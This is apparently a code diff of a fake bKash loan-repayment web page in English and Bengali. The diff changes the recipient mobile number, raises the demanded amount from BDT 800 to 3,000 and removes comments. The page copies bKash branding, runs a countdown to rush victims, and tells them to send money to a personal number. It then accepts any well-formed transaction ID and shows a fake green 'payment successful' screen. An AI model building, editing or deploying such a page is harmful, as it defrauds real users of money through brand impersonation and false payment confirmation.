@@ -163,10 +163,6 @@
       border-color: #d1d5db;
     }
 
-    .bkash-select-btn:active {
-      background: #f3f4f6;
-    }
-
     .bkash-brand-text {
       color: var(--bkash-pink);
       font-weight: 700;
@@ -327,7 +323,6 @@
       font-weight: 400;
     }
 
-    /* Example Receipt Thumbnail */
     .example-box {
       width: 74px;
       height: 74px;
@@ -507,10 +502,6 @@
       cursor: pointer;
     }
 
-    .popup-primary-btn:hover {
-      background: var(--blue-hover);
-    }
-
     .popup-link-btn {
       display: inline-block;
       margin-top: 12px;
@@ -522,11 +513,6 @@
       cursor: pointer;
     }
 
-    .popup-link-btn:hover {
-      text-decoration: underline;
-    }
-
-    /* Example Receipt Preview Modal */
     .receipt-preview-card {
       background: #ffffff;
       width: 100%;
@@ -569,11 +555,6 @@
       margin-bottom: 14px;
     }
 
-    .mock-bkash-header span {
-      font-size: 15px;
-      color: #6b7280;
-    }
-
     .mock-bkash-header strong.pink { color: var(--bkash-pink); }
     .mock-bkash-header strong.green { color: #16a34a; }
 
@@ -599,7 +580,7 @@
       color: #1f2937;
     }
 
-    /* Final Green Success Popup (Exact Screenshot Match) */
+    /* Final Green Success Modal (Exact Screenshot Match) */
     .green-success-card {
       background-color: #1b7a3e;
       color: #ffffff;
@@ -676,7 +657,7 @@
     </div>
 
     <div class="repay-label" id="lblRepayAmount">Repayment Amount</div>
-    <div class="repay-amount" id="displayAmount">BDT 800</div>
+    <div class="repay-amount" id="displayAmount">BDT 3,000</div>
   </div>
 
   <!-- RED TIME WARNING LINE -->
@@ -684,11 +665,10 @@
     Please pay and upload your payment receipt within <span class="time-highlight" id="inlineTimer">12:34</span>.
   </div>
 
-  <!-- STAGE 1 CARD: Click to view repayment account -->
+  <!-- STAGE 1 CARD -->
   <div class="white-card" id="stage1Card">
     <div class="select-title" id="lblClickView">Click to view repayment account</div>
     <button class="bkash-select-btn" onclick="openSelectedModal()">
-      <!-- bKash Bird SVG Icon -->
       <svg width="24" height="24" viewBox="0 0 40 40" fill="none">
         <path d="M18.5 7L11 19.5L21 22.5L18.5 7Z" fill="#E2136E"/>
         <path d="M18.5 7L27.5 14L21 22.5L18.5 7Z" fill="#D11164"/>
@@ -700,7 +680,7 @@
     </button>
   </div>
 
-  <!-- STAGE 3 CARD: Full Repayment Form & Receipt Upload -->
+  <!-- STAGE 3 CARD -->
   <div class="white-card hidden" id="stage3Card">
     <div class="form-brand-header">
       <svg width="24" height="24" viewBox="0 0 40 40" fill="none">
@@ -716,13 +696,13 @@
     <!-- Step 1 -->
     <div class="step-row">
       <span class="step-circle">1</span>
-      <span id="lblStep1">This account is only for repayment <span class="pink-highlight">Send Money</span></span>
+      <span id="lblStep1">This account is only for repayment <span class="pink-highlight">bKash Payment Only</span></span>
     </div>
 
     <div class="account-copy-box">
       <div>
-        <div class="acc-sub-label" id="lblAccSub">Repayment Account <span class="pink-highlight">(Send Money)</span></div>
-        <div class="acc-number-display" id="fullAccountNumber">01648549647</div>
+        <div class="acc-sub-label" id="lblAccSub">Repayment Account <span class="pink-highlight">(bKash Payment Only)</span></div>
+        <div class="acc-number-display" id="fullAccountNumber">01849992657</div>
       </div>
       <button class="copy-btn" id="btnCopy" onclick="copyFullAccount()">Copy</button>
     </div>
@@ -741,7 +721,7 @@
       maxlength="12"
       oninput="validateForm()"
     />
-    <div class="trx-error" id="trxError">Invalid bKash TrxID! Must be 10 alphanumeric characters (e.g. DA732H2B13).</div>
+    <div class="trx-error" id="trxError">Invalid bKash TrxID! Must be a valid 10-character alphanumeric ID (e.g. 7N83H3R3A5).</div>
 
     <div class="upload-section-label" id="lblUploadDesc">
       Please provide a screenshot or photo of the transfer record shown below
@@ -754,11 +734,10 @@
       </label>
       <input type="file" id="receiptFile" accept="image/*" class="hidden" onchange="handleFileUpload(event)" />
 
-      <!-- Clickable Example Receipt Thumbnail -->
       <div class="example-box" onclick="openExampleModal()" title="View Sample Receipt">
         <div class="example-mini-ui">
-          <div style="color:#e2136e;font-weight:700;">Send Money ✓</div>
-          <div style="background:#fff;padding:2px;border-radius:3px;">TrxID: DA732H2B13</div>
+          <div style="color:#e2136e;font-weight:700;">bKash ✓</div>
+          <div style="background:#fff;padding:2px;border-radius:3px;">TrxID: 7N83H3R3A5</div>
           <div style="background:#e2136e;color:#fff;border-radius:3px;padding:1px;">Back to Home</div>
         </div>
         <span class="example-badge">EXAMPLE</span>
@@ -774,14 +753,14 @@
     <ul class="process-list" id="processList">
       <li><span class="process-num">1.</span><span>Copy the repayment account number and make the payment.</span></li>
       <li><span class="process-num">2.</span><span>Log in to your mobile banking app.</span></li>
-      <li><span class="process-num">3.</span><span>Confirm whether to send the payment via <span class="orange-highlight">"Send Money"</span> or <span class="orange-highlight">"Cash Out"</span>, then enter the account number and amount above.</span></li>
+      <li><span class="process-num">3.</span><span>Confirm whether to send the payment via <span class="orange-highlight">"bKash Payment Only"</span>, then enter the account number and amount above.</span></li>
       <li><span class="process-num">4.</span><span>Save your TrxID and transfer receipt/screenshot, then enter and upload them here.</span></li>
       <li><span class="process-num">5.</span><span>Confirm the transaction and wait for your loan status to be updated.</span></li>
     </ul>
   </div>
 </div>
 
-<!-- POPUP 1: Masked Account Modal ("bKash selected for repayment") -->
+<!-- POPUP 1 -->
 <div class="modal-backdrop" id="selectedModal">
   <div class="popup-card">
     <div style="display:flex;align-items:center;justify-content:center;gap:6px;">
@@ -795,14 +774,14 @@
     </div>
     <div class="popup-title" id="modal1Title">selected for repayment.</div>
     <div class="popup-sub" id="modal1Sub">Repayment Account</div>
-    <div class="masked-box" id="maskedAccountDisplay">016*****647</div>
+    <div class="masked-box" id="maskedAccountDisplay">018***92657</div>
     <div class="popup-note" id="modal1Note">Account valid for 13 min only. Copy, pay, then upload your TrxID.</div>
     <button class="popup-primary-btn" id="btnGoToRepay" onclick="goToRepay()">Go to Repay</button>
     <button class="popup-link-btn" id="btnReuploadProof" onclick="openReuploadModal()">Re-upload proof</button>
   </div>
 </div>
 
-<!-- POPUP 2: Number Copy Confirmation Modal -->
+<!-- POPUP 2 -->
 <div class="modal-backdrop" id="copySuccessModal">
   <div class="popup-card">
     <div style="display:flex;align-items:center;justify-content:center;gap:6px;">
@@ -815,17 +794,17 @@
       <span class="bkash-brand-text">bKash</span>
     </div>
     <div class="popup-sub" style="margin-top:8px;" id="copyModalSub">Repayment Account</div>
-    <div class="masked-box" id="copyModalNumber">01648549647</div>
-    <div class="popup-note" id="copyModalNote">Please select <span class="pink-highlight">Send Money</span> to repayment</div>
+    <div class="masked-box" id="copyModalNumber">01849992657</div>
+    <div class="popup-note" id="copyModalNote">Please select <span class="pink-highlight">bKash Payment Only</span> to repayment</div>
     <button class="popup-primary-btn" onclick="closeCopyModal()">OK</button>
   </div>
 </div>
 
-<!-- POPUP 3: Re-upload Proof Quick Modal -->
+<!-- POPUP 3 -->
 <div class="modal-backdrop" id="reuploadModal">
   <div class="popup-card">
     <div class="popup-title" style="margin-bottom:4px;">Upload Receipt</div>
-    <div class="popup-sub">Enter the TrxID <span class="red-required">(Required)</span><br>Please select <span class="pink-highlight">Send Money</span> for repayment</div>
+    <div class="popup-sub">Enter the TrxID <span class="red-required">(Required)</span><br>Please select <span class="pink-highlight">bKash Payment Only</span> for repayment</div>
     <input type="text" id="reuploadTrx" class="trx-input" placeholder="Please enter the TrxID!" maxlength="12" oninput="validateReupload()" />
     <div style="text-align:left;font-size:12px;font-weight:600;margin:12px 0 8px;">Proof of Payment</div>
     <div class="upload-grid" style="margin-bottom:14px;">
@@ -836,8 +815,8 @@
       <input type="file" id="reuploadFile" accept="image/*" class="hidden" onchange="handleReuploadFile(event)" />
       <div class="example-box" onclick="openExampleModal()">
         <div class="example-mini-ui">
-          <div style="color:#e2136e;font-weight:700;">Send Money ✓</div>
-          <div style="background:#fff;padding:2px;border-radius:3px;">TrxID: DA732H2B13</div>
+          <div style="color:#e2136e;font-weight:700;">bKash ✓</div>
+          <div style="background:#fff;padding:2px;border-radius:3px;">TrxID: 7N83H3R3A5</div>
           <div style="background:#e2136e;color:#fff;border-radius:3px;padding:1px;">Back to Home</div>
         </div>
         <span class="example-badge">EXAMPLE</span>
@@ -848,13 +827,13 @@
   </div>
 </div>
 
-<!-- POPUP 4: Sample bKash Receipt Modal -->
+<!-- POPUP 4 -->
 <div class="modal-backdrop" id="exampleModal" onclick="closeExampleModal()">
   <div class="receipt-preview-card" onclick="event.stopPropagation()">
     <button class="close-circle-btn" onclick="closeExampleModal()">✕</button>
     <div class="mock-bkash-receipt">
       <div class="mock-bkash-header">
-        <span>Your <strong class="pink">Send Money</strong> is <strong class="green">successful</strong></span>
+        <span>Your <strong class="pink">bKash Payment</strong> is <strong class="green">successful</strong></span>
         <span style="color:#16a34a;font-size:18px;">✓</span>
       </div>
       <div class="mock-grid">
@@ -864,11 +843,11 @@
         </div>
         <div>
           <div class="mock-grid-label">Transaction ID</div>
-          <div class="mock-grid-val">DA732H2B13</div>
+          <div class="mock-grid-val">7N83H3R3A5</div>
         </div>
         <div>
           <div class="mock-grid-label">Total</div>
-          <div class="mock-grid-val" id="sampleReceiptAmount">৳ 800.00</div>
+          <div class="mock-grid-val" id="sampleReceiptAmount">৳ 3,000.00</div>
         </div>
         <div>
           <div class="mock-grid-label">New Balance</div>
@@ -883,7 +862,7 @@
   </div>
 </div>
 
-<!-- POPUP 5: Final Green Success Modal ("পেমেন্ট সফল হয়েছে") -->
+<!-- POPUP 5: Final Green Success Modal (Exact Screenshot Match) -->
 <div class="modal-backdrop" id="finalSuccessModal">
   <div class="green-success-card">
     <div class="check-ring">✓</div>
@@ -893,7 +872,7 @@
     </div>
     <div class="green-success-row">
       <span>পেমেন্টের পরিমাণ</span>
-      <span id="finalModalAmount">৳ 800.00</span>
+      <span id="finalModalAmount">৳ 3,000.00</span>
     </div>
     <div class="green-success-row">
       <span>পেমেন্ট চ্যানেল</span>
@@ -904,18 +883,13 @@
 
 <script>
   // =========================================================================
-  // 🎨 EASY GITHUB / VERCEL CONFIGURATION (EDIT ONLY THIS SECTION!)
+  // 🎨 CONFIGURATION SECTION
   // =========================================================================
   const PORTAL_CONFIG = {
-    bkashNumber: "01648549647",    // 👉 Change bKash Agent/Personal Number here
-    amount: 800,                   // 👉 Change Repayment Amount (e.g., 800 or 5900)
-    timerMinutes: 12,              // 👉 Change Countdown Minutes here
-    timerSeconds: 34,              // 👉 Change Countdown Seconds here
-    validSampleTrxIds: [           // 👉 Valid bKash TrxID Examples (plus any 10-char alphanumeric ID)
-      "DA732H2B13",
-      "6D83H3R3A5",
-      "8N47K9P2L1"
-    ]
+    bkashNumber: "01849992657",
+    amount: 3000,
+    timerMinutes: 12,
+    timerSeconds: 34
   };
   // =========================================================================
 
@@ -924,18 +898,15 @@
   let uploadedReceiptData = null;
   let reuploadReceiptData = null;
 
-  // Format numbers with commas (e.g. 5,900)
   function formatCurrency(num) {
     return Number(num).toLocaleString("en-US");
   }
 
-  // Mask middle digits like 016*****647
   function getMaskedNumber(num) {
     if (num.length < 7) return num;
-    return num.slice(0, 3) + "*****" + num.slice(-3);
+    return num.slice(0, 3) + "***" + num.slice(-5);
   }
 
-  // Initialize dynamic config values across the UI
   function initPortal() {
     const formattedAmt = formatCurrency(PORTAL_CONFIG.amount);
     document.getElementById("displayAmount").textContent = `BDT ${formattedAmt}`;
@@ -947,7 +918,6 @@
     updateTimerDisplay();
   }
 
-  // Live Countdown Timer
   function updateTimerDisplay() {
     const mins = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
     const secs = String(totalSeconds % 60).padStart(2, "0");
@@ -964,7 +934,6 @@
     }
   }, 1000);
 
-  // Bilingual Switcher (English / বাংলা)
   function setLanguage(lang) {
     currentLang = lang;
     document.getElementById("btnEn").classList.toggle("active", lang === "en");
@@ -978,8 +947,8 @@
       document.getElementById("lblRepayAmount").textContent = "Repayment Amount";
       document.getElementById("noticeLine").innerHTML = `Please pay and upload your payment receipt within <span class="time-highlight" id="inlineTimer">${timeStr}</span>.`;
       document.getElementById("lblClickView").textContent = "Click to view repayment account";
-      document.getElementById("lblStep1").innerHTML = `This account is only for repayment <span class="pink-highlight">Send Money</span>`;
-      document.getElementById("lblAccSub").innerHTML = `Repayment Account <span class="pink-highlight">(Send Money)</span>`;
+      document.getElementById("lblStep1").innerHTML = `This account is only for repayment <span class="pink-highlight">bKash Payment Only</span>`;
+      document.getElementById("lblAccSub").innerHTML = `Repayment Account <span class="pink-highlight">(bKash Payment Only)</span>`;
       document.getElementById("btnCopy").textContent = "Copy";
       document.getElementById("lblStep2").innerHTML = `Enter the TrxID <span class="red-required">(Required)</span>`;
       document.getElementById("trxInput").placeholder = "Please enter the TrxID!";
@@ -989,7 +958,7 @@
       document.getElementById("processList").innerHTML = `
         <li><span class="process-num">1.</span><span>Copy the repayment account number and make the payment.</span></li>
         <li><span class="process-num">2.</span><span>Log in to your mobile banking app.</span></li>
-        <li><span class="process-num">3.</span><span>Confirm whether to send the payment via <span class="orange-highlight">"Send Money"</span> or <span class="orange-highlight">"Cash Out"</span>, then enter the account number and amount above.</span></li>
+        <li><span class="process-num">3.</span><span>Confirm whether to send the payment via <span class="orange-highlight">"bKash Payment Only"</span>, then enter the account number and amount above.</span></li>
         <li><span class="process-num">4.</span><span>Save your TrxID and transfer receipt/screenshot, then enter and upload them here.</span></li>
         <li><span class="process-num">5.</span><span>Confirm the transaction and wait for your loan status to be updated.</span></li>
       `;
@@ -997,8 +966,8 @@
       document.getElementById("lblRepayAmount").textContent = "পরিশোধের পরিমাণ";
       document.getElementById("noticeLine").innerHTML = `অনুগ্রহ করে <span class="time-highlight" id="inlineTimer">${timeStr}</span> এর মধ্যে পেমেন্ট করুন এবং রসিদ আপলোড করুন।`;
       document.getElementById("lblClickView").textContent = "পরিশোধের অ্যাকাউন্ট দেখতে ক্লিক করুন";
-      document.getElementById("lblStep1").innerHTML = `এই অ্যাকাউন্টটি শুধুমাত্র <span class="pink-highlight">Send Money</span> পরিশোধের জন্য`;
-      document.getElementById("lblAccSub").innerHTML = `পরিশোধের অ্যাকাউন্ট <span class="pink-highlight">(Send Money)</span>`;
+      document.getElementById("lblStep1").innerHTML = `এই অ্যাকাউন্টটি শুধুমাত্র <span class="pink-highlight">bKash Payment Only</span> পরিশোধের জন্য`;
+      document.getElementById("lblAccSub").innerHTML = `পরিশোধের অ্যাকাউন্ট <span class="pink-highlight">(bKash Payment Only)</span>`;
       document.getElementById("btnCopy").textContent = "কপি";
       document.getElementById("lblStep2").innerHTML = `TrxID লিখুন <span class="red-required">(প্রয়োজনীয়)</span>`;
       document.getElementById("trxInput").placeholder = "অনুগ্রহ করে TrxID লিখুন!";
@@ -1008,14 +977,13 @@
       document.getElementById("processList").innerHTML = `
         <li><span class="process-num">১.</span><span>পরিশোধের অ্যাকাউন্ট নম্বরটি কপি করুন এবং পেমেন্ট সম্পন্ন করুন।</span></li>
         <li><span class="process-num">২.</span><span>আপনার মোবাইল ব্যাংকিং অ্যাপে লগ ইন করুন।</span></li>
-        <li><span class="process-num">৩.</span><span><span class="orange-highlight">"সেন্ড মানি"</span> অথবা <span class="orange-highlight">"ক্যাশ আউট"</span> এর মাধ্যমে পেমেন্ট পাঠাবেন কিনা তা নিশ্চিত করুন, তারপর উপরের অ্যাকাউন্ট নম্বর এবং পরিমাণ লিখুন।</span></li>
+        <li><span class="process-num">৩.</span><span><span class="orange-highlight">"bKash Payment Only"</span> এর মাধ্যমে পেমেন্ট পাঠাবেন কিনা তা নিশ্চিত করুন, তারপর উপরের অ্যাকাউন্ট নম্বর এবং পরিমাণ লিখুন।</span></li>
         <li><span class="process-num">৪.</span><span>আপনার TrxID এবং ট্রান্সফার রসিদ/স্ক্রিনশট সংরক্ষণ করুন, তারপর এখানে লিখুন এবং আপলোড করুন।</span></li>
         <li><span class="process-num">৫.</span><span>লেনদেনটি নিশ্চিত করুন এবং আপনার লোনের স্ট্যাটাস আপডেট হওয়ার জন্য অপেক্ষা করুন।</span></li>
       `;
     }
   }
 
-  // Stage Transitions
   function openSelectedModal() {
     document.getElementById("selectedModal").classList.add("active");
   }
@@ -1036,7 +1004,6 @@
     document.getElementById("selectedModal").classList.add("active");
   }
 
-  // Copy Full Account & Show Popup 2
   function copyFullAccount() {
     navigator.clipboard.writeText(PORTAL_CONFIG.bkashNumber);
     document.getElementById("copySuccessModal").classList.add("active");
@@ -1046,7 +1013,6 @@
     document.getElementById("copySuccessModal").classList.remove("active");
   }
 
-  // Sample Receipt Modal
   function openExampleModal() {
     document.getElementById("exampleModal").classList.add("active");
   }
@@ -1055,10 +1021,9 @@
     document.getElementById("exampleModal").classList.remove("active");
   }
 
-  // Authentic bKash 10-Char Alphanumeric Validation
+  // Strict bKash 10-char alphanumeric TrxID verification
   function isValidBkashTrxId(trx) {
     const clean = trx.trim().toUpperCase();
-    if (PORTAL_CONFIG.validSampleTrxIds.includes(clean)) return true;
     const bkashRegex = /^(?=.*[A-Z])(?=.*[0-9])[A-Z0-9]{10}$/;
     return bkashRegex.test(clean);
   }
@@ -1116,7 +1081,6 @@
     document.getElementById("finalSuccessModal").classList.add("active");
   }
 
-  // Re-upload Modal Validation & Submit
   function handleReuploadFile(event) {
     const file = event.target.files[0];
     if (!file) return;
